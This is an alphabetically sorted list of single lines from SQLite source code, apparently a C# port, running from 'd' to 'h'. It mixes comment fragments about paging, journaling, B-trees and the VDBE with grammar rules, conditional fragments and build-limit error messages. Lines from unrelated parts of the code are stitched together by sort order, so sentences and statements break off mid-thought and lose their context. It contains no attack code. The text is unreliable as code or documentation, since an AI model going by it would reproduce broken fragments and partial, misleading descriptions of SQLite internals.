 does not need to be recompiled on each invocation.
 does not really matter.  What is important is that sparse cursor
 does not work if either limit is negative.
 does so for compatibility we will do the same in software. 
 does this depends on whether or not the atomic-update optimization
 does this if the corresponding in-memory schema is currently
 does. An OP_Column to retrieve this imaginary column will
 doing this the directory is synced again before any individual
 done as a macro so that it will be optimized out when virtual
 dozen values in any of the other situations described above.
 driver.  And that causes all kinds of problems for our tests.  We
 drop locks.
 drop so the trigger cannot be dropped.  This results in an
 dropped too.  But if a TEMP trigger is created on a non-TEMP table
 dropped. Triggers are handled seperately because a trigger can be
 dummy pointer.
 duplicate the FROM clause as it is needed by both the DELETE/UPDATE tree
 duration of the operation. However the source database is only
 during a hash table resize is a benign fault.
 during initialization internally. This database connection handle may
 during rollback and will be overwritten whenever a rollback
 during some prior invocation.  Now we just have to customize the
 during the execution of complex SELECT statements.
 during the lifetime of the copy.  Use OP_Copy to make a complete
 dwErr != WAIT_ABANDONED)
 dynamic allocation in sContext.s (a Mem struct) is  released.
 dynamic mutex that it allocates. {A17021} The dynamic mutexes must not be in
 dynamically allocated space over to the pDest structure.
 e < pEList.nExpr 
 e0..e7    ........ 
 e2 < 0 
 e2 >= 0 
 e2-- )
 e8..ef    ........ 
 e==PTRMAP_BTREE )
 e==PTRMAP_OVERFLOW1 )
 eAuto <= 2 )
 eAuto == 2 ) )
 eCreate != 0 ) 
 eCreate == 1 )
 eDest == SRT_Coroutine )
 eDest == SRT_Set ) )
 eLock==WRITE_LOCK )
 eMode == PAGER_JOURNALMODE_DELETE
 eMode == PAGER_JOURNALMODE_MEMORY
 eMode == PAGER_JOURNALMODE_MEMORY )
 eMode == PAGER_JOURNALMODE_OFF
 eMode == PAGER_JOURNALMODE_OFF )
 eMode == PAGER_JOURNALMODE_PERSIST
 eMode == PAGER_JOURNALMODE_QUERY )
 eMode == PAGER_JOURNALMODE_TRUNCATE
 eMode == PAGER_LOCKINGMODE_EXCLUSIVE )
 eMode == PAGER_LOCKINGMODE_NORMAL
 eMode == PAGER_LOCKINGMODE_QUERY )
 eOp == SAVEPOINT_RELEASE )
 eType == 0 
 eType == PTRMAP_FREEPAGE)
 eType == PTRMAP_OVERFLOW1 
 eType == PTRMAP_OVERFLOW2 
 eType == PTRMAP_ROOTPAGE)
 eType == SQLITE_INTEGER )
 each SQL statement that is run.
 each child page in the database file.  The parent page is the page that
 each collation sequence structure.
 each database connection.
 each one to the list of all columns in all tables.
 each parameter to the SQL function.  These routines are used to
 each recursion 
 each recursion.
 each release but resets back to 0 whenever Y is incremented.
 each string is the symbolic name for the corresponding opcode.  If the
 each subexpression is separated by the AND operator or some other
 each term of the ORDER BY clause is a constant integer between 1
 each time.
 effective call to [sqlite3_initialize()].
 effectively converts the OUTER JOIN into an INNER JOIN.
 either SQLITE_OK (zero) or SQLITE_IGNORE or SQLITE_DENY.  If SQLITE_DENY
 either a COMMIT or a ROLLBACK operation. This routine may be called
 either a UTF-8 or UTF-16 string.  The _database_ routines return
 either of the shared-data or autovacuum features are compiled
 either to test for membership of the (...) set or to iterate through
 either. So the condition described in the above paragraph is not
 elem != null 
 elem = next_elem )
 elem.data : null
 element and a hash on the element's key.
 element is created and NULL is returned.
 element of the source-list passed as the second argument.
 element pointed to plus the next _ht.count-1 elements in the list.
 element will be valid after xOpen returns regardless of the success
 element.
 elementation of x.
 elements of the RowSet in sorted order.  Once this extraction
 elements we are now copying in.
 elements.  
 else
 else pPrev.pNext = pp.pNext
 else return 0
 elsewhere.
 embedded fraction must be 12.5% for both leaf-data and non-leaf-data.
 embedded processor.
 embedded) and thus do not count as a statement terminator.  Whitespace
 empty boolean index.
 empty in SQLite.  
 empty.
 empty.  Only the journal header is written.  Apparently it takes more
 emulation that uses only 32-bit mantissas instead of a full
 enabled 1 is returned. Otherwise 0.
 enc <= SQLITE_UTF16BE )
 enc == SQLITE_UTF16BE )
 enc == SQLITE_UTF16LE 
 enc2 == SQLITE_UTF16_ALIGNED )
 enc2 > SQLITE_UTF16BE )
 encapsulate the code that serializes values for storage in SQLite
 encnames[iEnc].enc : SQLITE_UTF16NATIVE
 encnames[iEnc].zName != null 
 encoded in UTF-8.
 encoded text. The end of each child journal file is marked with a
 encoding != 0 )
 encoding that will be used for the main database file if a new file
 encoding.
 encountering an error or an [sqlite3_interrupt 
 encryption.  The RC4 algorithm is being used as a PRNG (pseudo-random
 end loop over pSrcList 
 end of the file 
 end of the page and all free space is collected into one
 end result.
 end-of-error-codes 
 end.  We use the OP_Sort opcode instead of OP_Rewind to do the
 endian.
 endif
 endif aggregate query 
 endif pExpr.iTable==pItem.iCursor 
 endif pGroupBy.  Begin aggregate queries without GROUP BY: 
 ends with the script of a [CREATE TRIGGER 
 enough for all overflow cells.
 enough information about the compound query is known at that point.
 enough space to write the master journal name). If the master journal
 enough to contain 'n' buffers of 'sz' bytes each.
 enough to know that calling the developer will not help get rid
 ensures the internal encoding for the string representation is
 entered by the same thread.  The behavior is undefined if the mutex
 entire content of a database page.  This buffer is used internally
 entire tables.  Thus a three-way join is an O(N
 entire transaction.  The statement transaction will automatically
 entries 0 and 1.  Any ON or USING clauses associated with the join are
 entries and N
 entries in the table.
 entries or retrieve the key or data from the entry that the cursor
 entries that point to that record.
 entry and finally remove the cell itself from within the page.
 entry consists of a single byte 'type' and a 4 byte parent page number.
 entry corresponding to the new right-child pointer of the root
 entry in pEList.  (But leave references to the ROWID column
 entry in the sqlite_master table tht was created for this vtab
 entry in the tree.
 entry is copied to register P3 and control falls through to the next
 entry is overwritten.  The data is the value stored register
 entry or to no entry at all. In this case this function has to seek
 entry to which it is currently pointing.
 environment as long as no two threads attempt to use the same
 ephemeral table.
 epheremal table must be used unless the selected <column> is guaranteed
 eqTermMask )
 equal to or greater than iLimit are implicitly unpinned.
 equal to the number of entries on the RHS of the IN operator.
 equality constraints are all either DESC or ASC. 
 equivalent of atoi() and store 0 if no such conversion is possible.
 equivalent of atoi() and store 0.0 if no such conversion is possible.
 equivalent of atoi() or atof() and store 0 if no such conversion
 equivalent of printf().  Blob values are unchanged and
 equivalent pointer into the UTF-16 string by counting the unicode
 equivalent to an empty rowset.
 equivalents to the following standard library functions:
 erases all locks at once and returns us immediately to locking level 0.
 erasing iTable (this can happen with an auto-vacuum database).
 errCode
 error SQLITE_MAX_ATTACHED must be between 0 and 30
 error SQLITE_MAX_COLUMN must not exceed 32767
 error SQLITE_MAX_COMPOUND_SELECT must be at least 2
 error SQLITE_MAX_FUNCTION_ARG must be between 0 and 1000
 error SQLITE_MAX_LENGTH must be at least 100
 error SQLITE_MAX_LIKE_PATTERN_LENGTH must be at least 1
 error SQLITE_MAX_SQL_LENGTH must be at least 100
 error SQLITE_MAX_SQL_LENGTH must not be greater than SQLITE_MAX_LENGTH
 error SQLITE_MAX_VARIABLE_NUMBER must be at least 1
 error SQLITE_MAX_VDBE_OP must be at least 40
 error SQLite will not work correctly with the -ffast-math option of GCC.
 error code and message may or may not be set.
 error code is returned.
 error code is something goes wrong.
 error code of [SQLITE_ABORT].
 error code of [SQLITE_ABORT].  Writes to the BLOB that occurred
 error code.
 error go away.  Note: use [sqlite3_errmsg()] to find the text
 error is generated.  The P3 register is updated with the generated
 error is not inserted or updated.  Processing continues and no error
 error message
 error message in pParse.zErrMsg.
 error message text.  The calling function should free this memory
 error message to pErrorDb.
 error message.
 error other than [SQLITE_BUSY] and [SQLITE_MISUSE].  You must call
 error routine and continue going as if nothing had happened.
 error state error code is returned and 
 error string in the style of the printf functions: The following
 error which can be used to debug the application that is
 error.
 error.  ROLLBACK processing means that a constraint violation
 errors are considered fatal. At this point the application must accept 
 errors have been found.
 errors in places where we do not care about errors.
 escape 
 escape ::= 
 escape ::= ESCAPE expr 
 estLog( cost )
 estLog( nRow )
 estLog( pProbe.aiRowEst[0] )
 etc.) if applicable.  The 6th parameter to the authorizer callback
 eval -= 1
 eval -= 16
 eval -= 4
 eval -= 64
 evaluated at runtime.
 evaluated just once and then reused for each alias.
 even during normal debugging.  Use them only rarely on long-running
 even if that means explicitly writing data to the block of
 even if the other input is NULL.  A NULL and false or two NULLs
 even those that predate the Gregorian calendar.  Historians usually
 even though we might try to pick the best index multiple times.
 even when its contents have been corrupted.
 even when they are not.  This exercises the locking code and
 ever changes to make the previous sentence incorrect.
 every column that the two tables have in common.
 every program.  So a jump past the last instruction of the program
 every row that refers to a table of the same name as the one being
 everybody has finished with it.
 except that  these routines take a single [protected sqlite3_value] object
 except that it accepts two additional parameters for additional control
 except that it applies to leaf nodes in a LEAFDATA tree.  The maximum
 except that it has an extra parameter to specify 
 except that it takes an extra argument which is a destructor for
 except the data returned is in the encoding specified by the second
 excepted.)
 excluded from a build of SQLite.  Substitute a NULL pointer
 exclusion and is thus suitable for use only in applications
 exclusive mode.
 exclusive-access mode the file descriptor will be kept open and
 exclusivity flag only works for a new transaction.
 executed by a virtual machine.  Each instruction is an instance
 executed.
 executing this instruction.
 execution environment changes in a way that would alter the program
 execution of the vdbe program so that sqlite3_column_count() can
 execution of this virtual machine.
 execution.  It returns 1 if it makes changes and 0 if no flattening
 exist on the freeblock chain.  A group of 3 or fewer free bytes is called
 exist.
 existing BtShared object that we can share with
 existing cache entries with page numbers (keys) greater than or equal
 exists != 0 )
 exited at the end of the same function.
 exp
 exp 
 exp -= 8
 exp <= 350 ) { realvalue 
 exp = -exp
 exp > precision )
 exp--
 expLeft )
 expRight )
 expanded. 
 expects the join operator to be on the right operand.  This routine
 experimental interfaces are subject to change in point releases.
 explain ::= 
 explain ::= EXPLAIN 
 explain ::= EXPLAIN QUERY PLAN 
 explanation as to why it is safe to add an entry to an sqlite3.pDisconnect
 explicit indices.
 explicit transaction then you should rollback the transaction before
 explicit.
 explicitly mentioned in the expression.  That information is needed
 explicitly specified behavior for the index.
 explorer.exe 
 exponent of real numbers 
 expr 
 expr ::= BITNOT expr 
 expr ::= CASE case_operand case_exprlist case_else END 
 expr ::= CAST LP expr AS typetoken RP 
 expr ::= EXISTS LP select RP 
 expr ::= ID LP STAR RP 
 expr ::= ID LP distinct exprlist RP 
 expr ::= JOIN_KW 
 expr ::= LP expr RP 
 expr ::= LP select RP 
 expr ::= MINUS expr 
 expr ::= NOT expr 
 expr ::= PLUS expr 
 expr ::= RAISE LP IGNORE RP 
 expr ::= RAISE LP raisetype COMMA nm RP 
 expr ::= REGISTER 
 expr ::= VARIABLE 
 expr ::= expr AND expr 
 expr ::= expr BITAND
 expr ::= expr COLLATE ids 
 expr ::= expr CONCAT expr 
 expr ::= expr EQ
 expr ::= expr IS NOT NULL 
 expr ::= expr IS NULL 
 expr ::= expr ISNULL
 expr ::= expr LT
 expr ::= expr NOT NULL 
 expr ::= expr OR expr 
 expr ::= expr PLUS
 expr ::= expr STAR
 expr ::= expr between_op expr AND expr 
 expr ::= expr in_op LP exprlist RP 
 expr ::= expr in_op LP select RP 
 expr ::= expr in_op nm dbnm 
 expr ::= expr likeop expr escape 
 expr ::= id 
 expr ::= nm DOT nm 
 expr ::= nm DOT nm DOT nm 
 expr ::= term 
 expr on the right-hand side can be evaluated (and thus the constraint
 expr.c is trying to resolve a reference to a transient table (i.e. one
 expressed as a 32-bit integer. 
 expression and either jump over all of the code or fall thru.
 expression argument once and reused the compiled code for multiple
 expression being built up in zWhere.
 expression depends on table iRightJoinTable even if that table is not
 expression is also NULL.
 expression it is handled the same way. A virtual table is
 expression list into a sequence of registers beginning at target.
 expression list.  Return the number of errors.
 expression node refer back to that source column.  The following changes
 expression or subquery) then the declared type of the table
 expression pExpr. The string may be treated as static by the caller.
 expression passed as the first argument. The second argument is a
 expression that is usually false.  Macro likely() surrounds
 expression we need to rerun this code each time.
 expression.
 expressions could be omitted from the code completely.  But they
 expressions in the
 expressions in the WHERE clause (etc.) can refer to expressions by
 expressions that are constant at compile time. This includes literal
 expressions that need to be placed in a particular register.
 exprlist 
 exprlist ::= 
 exprlist ::= nexprlist 
 exprssion is NULL.
 extended result codes]
 extends only to the 26 characters used in the English language.
 extensions.
 extensions. {END}  It undoes the effect of all prior
 external linkage.
 external process or via a database connection other than the one being
 extra bytes for the header length itself.  32768
 extract UTF-16 strings as big-endian and little-endian respectively.
 extract values from the [sqlite3_value] objects.
 extracted from in NameContext.pSrcList. This table may be real
 extracts the least value from the RowSet.
 f )
 f0..f7    ........ 
 f2 
 f8..ff    ........ 
 fail.
 fails also (the if(...) statement above). But if people are
 fails with an error code of SQLITE_SCHEMA if it is ever executed
 fails with an error message stating that the function is used in the
 fails. Internal data structure corruption will result otherwise.
 failure on the same database connection) then always return 0.
 failure to zero-fill short reads will eventually lead to
 failure we have quit before reaching this point. 
 failure.
 failures.  Level 1 is the same as asynchronous (no syncs() occur and
 fall thru 
 false does not mean that the number can be successfully converted into
 false for a file-based database. This symbol is only required if
 false for the statement journal.  The main rollback journal uses
 false if it is still positive.
 false if it is used for an in-memory database. The cache implementation
 feature is enabled (if sqlite3Tsd()->useSharedData is true). They are
 feature.
 features recently added to SQLite.  We do not anticipate changes
 fetched page.  But we retain the following test in case xRekey()
 few minor changes to the program.
 field (type Bitmask) it must be aligned on an 8-byte boundary on
 field is not used.
 field of the index key.
 field of the sqlite3 structure is set in order to simulate and interrupt.
 field of the table under construction to be the index of the
 field. The second while(...) loop copies the key value from the
 fields are not changed in any context.
 fields do not need to be freed when deallocating the AggInfo structure.
 fields of the Hash structure.
 fields.
 fields.  The translation is used in order to maximize the number of
 figure includes calls made to [sqlite3_malloc()] by the application
 figure out how many UTF-8 characters are in zName 
 file after power is restored.  If an attempt is then made
 file and write the first journal-header to it.
 file before the failure occurred.
 file before this function is called.
 file exists if the following criteria are met:
 file for a transaction involving two databases might be:
 file happens to be a journal-header (written as part of the
 file has been finalized it is not possible to use it to roll back a
 file header    
 file header points to the first in a linked list of trunk page.  Each trunk
 file header that occurs before the page header.
 file in memory to implement the atomic-write optimization (see
 file instead of in the main database file.  This is normally the case
 file instead of into the main database file.
 file is given by P1.
 file is not pBt.pageSize. In this case lockBtree() will update
 file is required for an atomic commit.
 file it may contain some garbage data. There are two scenarios
 file itself.  The value returned is the maximum number of
 file name. The layout in memory is as follows:
 file operating in no-sync mode (Pager.noSync set to non-zero).
 file should be closed and deleted. If this connection writes to
 file that referred to the master journal file has just been rolled back.
 file the database must be corrupt. 
 file to the required size.
 file used for temporary tables.  Indices of 2 or more are used for
 file when this routine is called.
 file will be doing page-aligned sector reads and writes in a random
 file.
 file.  In that case we are not in any hurry.  Use the (relatively
 file. By passing this as the number of pages to copy to
 file. Return an error code to the caller if an IO error occurs.
 file. The current location in the journal file is given by
 file. This can only happen in auto-vacuum mode.
 file_format==1    Version 3.0.0.
 file_format==2    Version 3.1.3.  // ALTER TABLE ADD COLUMN
 file_format==3    Version 3.1.4.  // ditto but with non-NULL defaults
 file_format==4    Version 3.3.0.  // DESC indices.  Boolean constants
 filename argument. The filename argument is interpreted as UTF-8 for
 filename if it needs to remember the filename for some reason.
 filenames between the UTF-8 encoding used by SQLite
 files.
 files.  If iDb>=1 then reset the internal schema for only the
 fill the ephemeral table
 fill up.  On average.
 filled with data (pagesize - 4 bytes).  The last page can have as little
 filled with single-field index keys representing the results
 final argument to routines like [sqlite3_result_blob()].  If the destructor
 finalize] all [prepared statements]
 finalized at this point (since it is not a valid journal file anyway).
 finalized or reset the parser error message is available via
 finalized.
 finalized] or on one that had
 find out whether SQLite automatically rolled back the transaction after
 finds the left-most entry beneath the 
 finds the right-most entry beneath the page
 finished using that result.
 first VFS on the list.
 first argument.
 first byte of on-disk image of every BTree page.
 first column of the index.  aiRowEst[2] is an estimate of the number
 first column to be indexed (c3) has an index of 2 in Ex1.aCol[].
 first doing some 
 first free-list trunk page. iPrevTrunk is initially 1.
 first iteration (since the first iteration of the loop is
 first matching table is returned.  (No checking for duplicate table
 first null byte.  If n>0 then copy n
 first part does the start of the WHERE loop and the second
 first row to be deleted.  All data is deleted when the cursor is
 first time (in other words if the virtual table is actually being
 first time a page is loaded into memory. If the page requested is
 first to get things going.  Then this routine is called for each
 first trunk page in the current free-list. This block tests if it
 first two parameters is reversed from snprintf().  This is an
 fit on a single disk sector. In this case all co-resident pages
 fits entirely on the main b-tree page.  
 fix the size of the file. However it is important to call
 fixed amount of payload can be carried directly on the database
 flag != 0 )
 flag (bPurgeable) are set when the cache is created. nMax may be
 flag if there are any active statements. 
 flag is set this is not required.
 flag is true if the table should be stored in the auxiliary database
 flag may be ORed in to indicate that only the data of the file
 flag on an expression structure.  This flag is used for VV
 flag on the expression so that it will be able to used a
 flag.
 flag.  An explicit collating sequence will override implicit
 flag_alternateform 
 flag_altform2
 flag_dp )
 flags 
 flags )
 flags = (flags 
 flags = BTREE_INTKEY
 flags == 0 )
 flags controlling this file 
 flags defined in sqliteInt.h 
 flags from both inputs 
 flags may coexist with the MEM_Str flag.
 flags might not work:
 flags parameter will include [SQLITE_OPEN_DELETEONCLOSE].
 flags passed through to sqlite3_vfs.xOpen() 
 flags that describe the strategy 
 flattening (as described above).  If we are doing a different kind
 float in the wrong order.  And that error has been propagated
 floating point values is correct.
 follow the reduce.
 following Debug.Asserts verify this fact. 
 following a call to sqlite3_shutdown().  Only an effective call
 following a type conversion.
 following call will modify the in-memory representation of page 1
 following enumeration.
 following instruction to P2.
 following is accomplished:
 following is true for all dirty pages currently in the page-cache:
 following kinds of SQL syntax:
 following nextX causes a jump to the end of the select processing.
 following pseudocode (template 3):
 following pseudocode (template 4):
 following structure to describe cursors that point into the
 following structure) to reduce memory allocation overhead.  The
 following structure.
 following table describes the relationship between these two values
 following the truncation or zeroing described above the size of the
 following values of flags are currently in use.  Other values for
 following values.
 following were coded:
 follows
 follows:
 foolproof but it does provide some measure of protection against
 for JournalFile p.
 for MSVC and a macro for everything else.  Ticket 
 for P1 to move so that it points to the rowid given by P2.
 for SQLite to use for all of its dynamic memory needs.
 for a column declared UNIQUE.  This is the way Informix and SQL Server
 for a compatible index:
 for a completely different meaning.  Software that links against both
 for a description of what each of these routines does.
 for a numeric type is a single comparison.
 for a specified amount of time when a table is locked.  The handler
 for additional information.
 for all bytes that have the 8th bit set and one byte with the 8th
 for all of its dynamic memory allocation needs beyond those provided
 for all open savepoints before returning.
 for all tables and indices in the database.
 for all tables to the left of a left join is important.  Ticket 
 for an SQL NULL default below.
 for any b-tree or overflow pages that pTo now contains the pointers to.
 for any missing APIs.
 for any subsequent allocations that need to occur.
 for at least a number of milliseconds specified in its parameter.
 for auxiliary databases.
 for being unreasonable so I do not doubt that it might happen.  If
 for by [SQLITE_CONFIG_SCRATCH] and [SQLITE_CONFIG_PAGECACHE].
 for cases like this:
 for certain that original page contents are synced into the main rollback
 for copying in-memory databases to or from persistent files. 
 for details.
 for duplicate index names is done.)  The search order is
 for each column to be updated in the pChanges array.  For each
 for each row to be changed:
 for exclusive access.
 for factoring out of a loop.  Appropriate expressions are:
 for fast set membership tests. In this case an epheremal table must
 for freeing the expression p is Debug.Assumed by the WhereClause object pWC.
 for generating VDBE code that evaluates expressions in SQLite.
 for helping to understand what is happening inside the code generator
 for hot-journal rollback. Once this is done the transaction is
 for incremental blob IO only.
 for index pDest in an insert transfer optimization.  The rules
 for indices is OP_IdxInsert.
 for maximum code portability it is recommended that applications
 for membership testing only.  There is no need to initialize any
 for name resolution but are actually overloaded by the xFindFunction
 for now.  At some point in the future (once everyone has upgraded
 for pCell[].
 for page 1 which is held in use in order to keep the lock on the
 for pageSize.
 for read access returns SQLITE_EMPTY. In this case always
 for setting pointer-map entries.
 for situations where the memory might be held long-term.  This
 for sqlite3_create_collation() and sqlite3_create_collation_v2()
 for sqlite3_create_function16().
 for tables is OP_Insert.
 for testing.
 for that page now.
 for that table.
 for the VdbeOp definition.
 for the column and the P4 value is not required.
 for the constraint is used.
 for the cost of the sort. 
 for the current loop.  Jump to addrBrk to break out of a loop.
 for the duration of the query (i.e. the SELECT that generates the b-tree
 for the encoding 'enc' from the database 'db'.
 for the entry that the pCur cursor is pointing to. If the eOp
 for the following reasons:
 for the logic that removes duplicate result rows when the
 for the new page number to be greater than the largest previously
 for the next GROUP BY batch.
 for the overflow page.
 for the page moved there.
 for the portion used by the new allocation. 
 for the result set.  The KeyInfo for addrOpenTran[2] contains collating
 for the run-time allocated buffer.
 for the same [prepared statement] and result column
 for the same database connection is overridden.
 for the second parameter is [SQLITE_DBSTATUS_LOOKASIDE_USED].
 for the table being altered and sets Parse.pNewTable to point
 for the table from the db.init.newTnum field.  (The page number
 for the table using the same algorithm used by the database engine to
 for the table.  Indices are opened on subsequent cursors.
 for the temp
 for the time value p where p is in UTC.
 for the values it stores. Values stored in sqlite3_value objects
 for their own use.  The pMethods entry is a pointer to an
 for this node and for the pToken argument is a single allocation
 for use by the VFS layers as space for managing file locks.
 for use in DLLs since DLL users usually do not have direct access to string
 for variables that need to be added to the pParse.aAgg[] array.
 for verifying the correct operation of the SQLite library.  Depending
 for very large databases.  But one should test the page skipping logic
 for which either sqlite3.pBlockingConnection or sqlite3.pUnlockConnection
 for which the pointer is stored within the content being copied.
 force schema reloading
 forces an automatic rollback of the changes.  See the
 foreign key.
 form X.Y.Z or Y.Z or just Z where
 form Z (with no X and Y prefix) where the Z matches the right-hand
 form a distinct entry.  iTab is a sorting index that holds previously
 form that refer to the particular virtual table being queried.
 form:
 format characters are allowed:
 format.
 forming the SrcList.  This prevents a trigger in one database from
 forms return the current setting.
 forth parameter 
 found at self.pBt.mutex.
 found in the standard C library.  The following enhancements are
 found that many systems do not have a working isnan() function so
 four bytes of the divider cell. So the pointer is safe to use
 fractional days (100-nanoseconds) 
 fractional seconds  SS.SSS
 fractional seconds FFFF can be one or more digits.
 fragmented bytes within the page. 
 free blocks into a single big free block.
 free pages is not visible.  So Cookie[0] is the same as Meta[1].
 free the subtrees and return NULL.
 free-list for reuse. It returns false if it is safe to retrieve the
 free-list leaf pages:
 free-list until the page 'nearby' is located.
 freeblocks that overlapped cells.   Nor does it detect when the
 freeblocks.  Each freeblock is at least 4 bytes in size.  The byte offset
 freed before the copy is made.
 freed by sqlite3_free() and the zErrMsg field will be zeroed.
 freed.  Add the KeyInfo structure to the P4 field of an opcode using
 from 
 from ::= 
 from ::= FROM seltablist 
 from A by replacing every occurance of B with C.  The match
 from [sqlite3_malloc()] before it returns.
 from a single sqliteMalloc().  But no copy is made and the calling
 from being considered constant. 
 from comments in this file.  This file is the authoritative source
 from disk.
 from forming.
 from interrupting a statement that has not yet started.
 from malloc().  But the caller cannot free this memory directly.
 from malloc.
 from pParent.
 from source tables rather than from accumulators 
 from sqlite3Init and OP_ParseSchema into the sqlite3InitCallback.
 from sqlite3Malloc() and p.zErrMsg is made to point to that memory.
 from sqlite3Malloc().
 from sqliteMalloc() and must be freed by the calling function.
 from the SELECT or the <exprlist>.
 from the SQLITE_MASTER table.
 from the column cache.
 from the database handle into the statement and sets the statement
 from the disk more rapidly.
 from the file size.  This value is used when the user selects the
 from the header file
 from the input.  The following tokens are significant:
 from the internal node. The 'previous' entry is used for this instead
 from the result in the result-set.  We might fix this someday.  Or
 from the source database.
 from the sparse cursor numbers into consecutive integers beginning
 from the standard C library.
 from the sub-journal (if isMainJrnl==0) and playback that page.
 from the xRandomness method of the default [sqlite3_vfs] object.
 from this record.  If there are less that (P2
 from trying to save the current position of the cursor.  
 from wireshark this week.  Clearly they are stressing Lemon in ways
 from within other threads.
 from within the call to sqlite3_unlock_notify().
 from xFullPathname().  SQLite further guarantees that
 fs.SafeFileHandle.IsInvalid ) //(h == INVALID_HANDLE_VALUE)
 full    
 fullname 
 fullname ::= nm dbnm 
 function 
 function allocates memory by calling sqlite3Malloc(). If an allocation
 function also deals with the special case where 2 or more pages
 function as the destructor on the text or BLOB result when it has
 function can gain access to this pointer using [sqlite3_user_data()].
 function does not actually modify the database file on disk. It
 function found is returned.  A function is valid if either xFunc
 function given by the 4th parameter to sqlite3_set_auxdata() on
 function has P5 arguments.   P4 is a pointer to the FuncDef
 function has to search through the database schema.
 function is a no-op.
 function is capable of transforming these types of expressions into
 function is responsible for seeing that this structure is eventually
 function is to be added.  If a single program uses more than one database
 function must not try to call [sqlite3_free()] directly.  Only
 function names.  The operator for aggregate functions is changed
 function result.
 function returning SQLITE_IOERR_NOMEM using the DO_OS_MALLOC_TEST macro.
 function should 
 function should never be used.
 function tests if the SELECT is of the form:
 function that calls sqlite3_initialize().
 function that is already in the pAggInfo structure
 function to be invoked whenever a transaction is [COMMIT 
 function to be invoked whenever a transaction is [ROLLBACK 
 function was called and the journal file does not exist.  
 function was determined to be constant at compile time. If the first
 function which does the work of interpreting a VDBE program.
 function.
 function. The compiled version of the regular expression is stored as
 functionality.
 functions are threadsafe.
 functions call sqlite3MallocRaw() directly instead of sqliteMalloc(). This
 functions for SQLite.
 functions need be called.
 functions of SQLite.
 functions that can take varying numbers of arguments.  The
 functions that take a state number and lookahead value and return an
 functions used to bind values to host parameters in prepared statements.
 functions with the same name but with either differing numbers of
 functions.
 functions.  Note that the 
 functions.  This should be the only routine in this file with
 future releases of SQLite.  Applications that care about shared
 future versions of SQLite.  Additional fields may be appended to this
 gap left by the deleted root-page.
 gdbm_reorganize() on all the database tables.  But beginning
 general purpose header file.
 generate the SELECT expression tree. 
 generated record number.  No new record numbers are allowed to be less
 generated to suppress duplicates.  pKeyInfo is used for comparing
 generating the code that loops through a table looking for applicable
 generation of a single trigger program. While the trigger program is being
 generator (PRNG) for SQLite.
 get as many WHERE clause terms into the form shown above as possible.
 get full branch coverage.  The testcase() macro is inserted
 get them all.
 get2byte((P).aData[(P).cellOffset
 getDigits( zDate.Substring( zDate.IndexOf( nextC0 ) 
 getDigits( zDate1.Substring( zDate1.IndexOf( nextC1 ) 
 getReadLock( pFile ) == 0 )
 gets freed when the Vdbe is finalized so it still should be obtained
 give a NULL output.
 given callback function with the given argument.
 given callback function with the given argument. The progress callback will
 given in the argument has a valid
 gives a different answer at different times during statement processing
 gives more opportunity for asserts(sqlite3_mutex_held())
 giving up and returning an error.
 global SQLITE_MUTEX_STATIC_MASTER mutex.  The pPager field
 global pcache mutex and unlock the pager-cache object pCache. This is
 go 
 goes to [sqlite3_malloc()] to obtain the memory it needs.</dd>
 good source of random numbers.  The lrand48() library function may
 goto balance_cleanup
 greater than 100 to avoid conflicts.
 greater than or equal to iLimit. Any pinned pages that meet this
 greater than the current database size (pPager.dbSize) but those
 groupby_opt 
 groupby_opt ::= 
 groupby_opt ::= GROUP BY nexprlist 
 growOpArray( p ) != 0 )
 guarantee that the page is well-formed.  It only shows that
 guarantee that the shared cache used by the destination database
 guaranteed to find the index specified in the INDEXED BY clause
 guaranteed to operate on the row with the minimum or maximum
 guarantees that the buffer is always zero-terminated.  The first
 h < pCache.nHash 
 h <= '9' ) 
 h <= 'F' ) )
 h <= 'f' ) 
 half does the tail of the WHERE loop.  An instance of
 handed to [pagecache memory allocator].  Only the value returned in the
 handed to [scratch memory allocator].  Only the value returned in the
 handed to [sqlite3_malloc()] or [sqlite3_realloc()] (or their
 handle associated with the destination database and the database name 
 handle case conversions for the UTF character set since the tables
 handle in the compiled query.
 handle is passed a pointer to sqlite.busyHandler. The busy-handler
 handle used to access the virtual table 
 handle.
 handle] to the BLOB located
 handles
 handles are not xDisconnect()ed 
 handles can not be shared between 
 handles housekeeping details such as creating and deleting
 handles point to Incrblob structures.
 handles up to iDivisor separate values of i.  apSub[0] holds
 happens to hold.
 hard upper bound]
 hard-coded to true or else it asserts if its argument is false.
 has NB or fewer children then all children of pParent are taken.
 has REAL affinity.  Such column values may still be stored as
 has a UNIQUE constraint or UNIQUE index.
 has a height equal to the maximum height of any other
 has a read or write transaction open on the database.
 has already been allocated and is passed in as the p pointer.
 has already been allocated. So assume sqlite3GetVdbe() is always
 has already been called on the new page.)  The new page has also
 has already been loaded into a register.  The value will always
 has an arbitrary key but no data.
 has an index of 1.
 has been completely parsed.
 has been created or not.
 has been determined that no other b-tree holds a conflicting lock.  
 has been modified by a transaction on the source pager. Copy
 has been parsed. Argument pColDef contains the text of the new
 has been removed (CREATE INDEX needs to move a page when a statement
 has been successfully called. If a shared-lock is already held when
 has ever happened.
 has fewer than 2 siblings (something which can only happen if the page
 has it own pointer to this object.  But each instance of this object
 has locked the required resource is stored internally. After an 
 has no effect if the sub-journal is already opened (as it may be when
 has no function other than to help verify the correct operation of the
 has no other tables or sub-selects in the FROM clause.
 has not already been initialized. In this case it sets the default
 has the effect of releasing the read lock.
 has the following properties:
 has the same name as another index on a permanent index.  Since
 has to be allocated on an INSERT.)  The cost of a TEST with a new
 has to be included before os2.h for linking to work 
 hash table that matches the given key.  The hash for this key has
 hash table will continue to function normally.  So a malloc failure
 hash table.
 hash tables.
 have a 4-byte integer key and can have arbitrary data.  An index
 have already been removed.
 have an affinity:
 have been deleted
 have been opened at any point in the VDBE program beginning at location
 have been overwritten by the statement that expired the BLOB handle
 have fields overwritten with new information appropriate for the
 have the same rootpage number as the real table or index that is
 have to specify the value in the less intuitive manner shown:
 having to check to see if the return from this routine is a valid pointer.
 having to double-check to make sure that the result is non-negative. But
 having to make additional calls to fetch the content portion of
 having_opt 
 having_opt ::= 
 having_opt ::= HAVING expr 
 hdr-size 
 hdr-size field is also a varint which is the offset from the beginning
 header (JOURNAL_HDR_SZ bytes) is written into the journal file at the
 header file that defines a number for each opcode used by the VDBE.
 header must be exactly 16 bytes including the zero-terminator so
 header to be written between the pages journaled by this function.
 header with the nRec field set to 0. If such a journal is used as
 heap memory used by sqlite is used by the page cache to cache data read 
 held by SQLite. An example of non-essential memory is memory used to
 held by Y.
 held by another reader process who will release it momentarily.
 held by open cursors.
 held by the database library. {END}  Memory used to cache database
 held by the pager system. Memory in use by any SQLite pager allocated
 held in register P1.
